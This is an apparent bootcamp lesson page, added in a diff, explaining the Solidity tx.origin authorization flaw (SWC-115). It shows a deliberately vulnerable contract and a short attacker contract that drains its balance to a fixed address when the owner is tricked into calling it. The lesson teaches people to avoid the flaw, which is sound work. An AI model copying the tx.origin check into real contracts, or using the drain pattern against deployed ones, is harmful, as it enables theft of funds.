@@ -1,0 +1,68 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=">
+  <link rel="stylesheet" href="../../../style.css">
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.6.0/gsap.min.js" async></script>
+  <script src="../../../js/text-bounce.js" async></script>
+  <title>Smart Contract Pitfalls and Attacks</title>
+</head>
+<div class="body">
+
+    <h2>TxOrigin Attack (SWC-115)</h2>
+  
+    <p>In this lesson we are going to cover a <code>tx.origin</code> attack. The global variable <code>tx.origin</code> in Solidity always references the address of the original sender of the transaction, of the full call chain. <a href="https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=tx.origin#block-and-transaction-properties" target="_blank">See the reference in the docs here.</a> This is different than <code>msg.sender</code> in that <code>msg.sender</code> references the address of the sender of the current call.</p>
+  
+    <p>
+      <br>
+    </p>
+  
+    <p>You should never use <code>tx.origin</code> in Solidity for authorization (<a href="https://swcregistry.io/docs/SWC-115" target="_blank">SWC-115</a>). The following smart contract shows you why. It is susceptible to attack.</p><pre class="wrong">pragma solidity &gt;0.5.0;
+  // Example Tx.Origin Authentication Attack
+   
+  contract VulnerableContract {
+      address payable owner = msg.sender;
+       
+      function withdraw(address payable _recipient) public {
+          require(tx.origin == owner);
+          _recipient.transfer(address(this).balance);
+      }
+       
+      function getBalance() view public returns(uint) {
+          return address(this).balance;
+      }
+       
+      function() external payable {}
+  }
+   
+  contract MaliciousContract {
+      VulnerableContract vulnerableContract = VulnerableContract(0x08970FEd061E7747CD9a38d680A601510CB659FB);
+      address payable attackerAddress = 0xdD870fA1b7C4700F2BD7f44238821C26f7392148;
+       
+      function() external payable {
+          vulnerableContract.withdraw(attackerAddress);
+      }
+  }</pre>
+  
+    <p>In this contract, if the creator of the VulnerableContract is tricked into calling the MaliciousContract, the Malicious contract will be able to drain the VulnerableContract of all funds.</p>
+  
+    <p>Additional Resources:</p>
+  
+    <ul>
+      <li><a href="https://solidity.readthedocs.io/en/latest/security-considerations.html?#tx-origin" target="_blank">Solidity documentation on the security considerations of tx.origin</a></li>
+      <li><a href="https://swcregistry.io/docs/SWC-115" target="_blank">The SWC Registry entry for Authorization through tx.origin</a></li>
+    </ul>
+
+  
+  <!-- Be sure to alter the link below to add in correct Module and Lesson Number  -->
+    <div class="footer">
+      <a href="https://github.com/ConsenSys-Academy/Blockchain-Developer-Bootcamp/edit/main/S03-smart-contracts/M6-security/L2b-tx-origin-attack/index.html" target="_blank">Edit this page on Github</a>
+      
+      <div class="discord">
+        <img class="discord-logo" src="../../../img/discord.svg" alt="Discord logo" ><a href="https://discord.gg/FrHSjSn9dX" target="_blank" >Questions? Ask on Discord! </a>  
+      </div> 
+    </div>
+</div>
+
+</html>
